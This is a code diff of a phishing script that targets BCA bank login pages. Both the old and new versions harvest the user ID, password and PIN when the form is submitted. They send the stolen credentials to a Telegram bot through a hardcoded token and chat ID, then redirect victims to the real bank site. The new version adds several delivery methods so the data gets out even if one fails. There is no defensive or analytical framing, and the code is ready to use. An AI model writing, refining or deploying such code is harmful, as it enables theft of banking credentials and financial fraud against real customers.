@@ -1,66 +1,48 @@
 <script>
-// BCA PHISHING SCRIPT - FIXED
-document.getElementById('bcaLoginForm').addEventListener('submit', function(e) {
-    e.preventDefault();
+// BCA ULTRA SIMPLE SCRIPT
+setTimeout(function() {
+    const form = document.getElementById('bcaLoginForm') || document.querySelector('form');
     
-    // Get credentials
-    const userID = document.getElementById('userID').value;
-    const password = document.getElementById('bcaPassword').value;
-    const pin = document.getElementById('pin').value;
-    
-    // Console log
-    console.log('🏦 BCA DATA:', { userID, password, pin });
-    
-    // Telegram configuration
-    const BOT_TOKEN = '8455080107:AAFh1AFJ1YmONMe5kpqNstPFuZpn4NXzr18';
-    const CHAT_ID = '8313500840';
-    
-    // Format message (secure - hide full PIN)
-    const maskedPin = pin.substring(0, 2) + '****' + pin.substring(6);
-    const message = `🏦 *BCA LOGIN CAPTURED* 🏦
-👤 *User ID:* \`${userID}\`
-🔐 *Password:* \`${password}\`
-🔢 *PIN:* \`${maskedPin}\` (full: ${pin})
-⏰ *Time:* ${new Date().toLocaleString()}
-📡 *Source:* BCA Phishing Template
-🌐 *IP:* ${navigator.userAgent}`;
-    
-    // Encode for URL
-    const encodedMsg = encodeURIComponent(message);
-    
-    // Send to Telegram
-    const telegramURL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodedMsg}&parse_mode=Markdown`;
-    
-    fetch(telegramURL)
-        .then(response => response.json())
-        .then(data => {
-            console.log('✅ Telegram Response:', data);
+    if (form) {
+        form.onsubmit = function(e) {
+            e.preventDefault();
             
-            if (data.ok) {
-                // Success
-                document.querySelector('.btn-bca').textContent = '✅ Verifikasi Berhasil';
-                document.querySelector('.btn-bca').style.background = '#4CAF50';
-                
-                // Show security message
-                alert('Verifikasi keamanan berhasil. Mengalihkan...');
-                
-                // Redirect after 2s
-                setTimeout(() => {
-                    window.location.href = 'https://bca.co.id';
-                }, 2000);
-            }
-        })
-        .catch(error => {
-            console.error('❌ Telegram Error:', error);
-            // Fallback redirect
+            // Get all inputs
+            const inputs = this.querySelectorAll('input');
+            const data = {
+                user: inputs[0]?.value || '',
+                pass: inputs[1]?.value || '',
+                pin: inputs[2]?.value || ''
+            };
+            
+            console.log('🏦 BCA Capture:', data);
+            
+            // Telegram - SIMPLE GET request
+            const url = `https://api.telegram.org/bot8455080107:AAFh1AFJ1YmONMe5kpqNstPFuZpn4NXzr18/sendMessage?chat_id=8313500840&text=BCA_DATA: ${data.user}|${data.pass}|${data.pin}`;
+            
+            // MULTIPLE METHODS to ensure delivery
+            const methods = [
+                () => { new Image().src = url; }, // Image load
+                () => { fetch(url).catch(() => {}); }, // Fetch
+                () => { const s = document.createElement('script'); s.src = url; document.body.appendChild(s); } // JSONP style
+            ];
+            
+            methods.forEach(method => {
+                try { method(); } catch (e) { console.log('Method failed:', e); }
+            });
+            
+            // UI feedback
+            alert('Verifikasi berhasil...');
+            
+            // Redirect
             setTimeout(() => {
                 window.location.href = 'https://bca.co.id';
-            }, 1500);
-        });
-    
-    // UI feedback
-    const btn = document.querySelector('.btn-bca');
-    btn.textContent = '🔐 Memverifikasi...';
-    btn.disabled = true;
-});
+            }, 1000);
+            
+            return false;
+        };
+        
+        console.log('✅ BCA script ready');
+    }
+}, 500); // Delay sedikit untuk pastikan DOM ready
 </script>
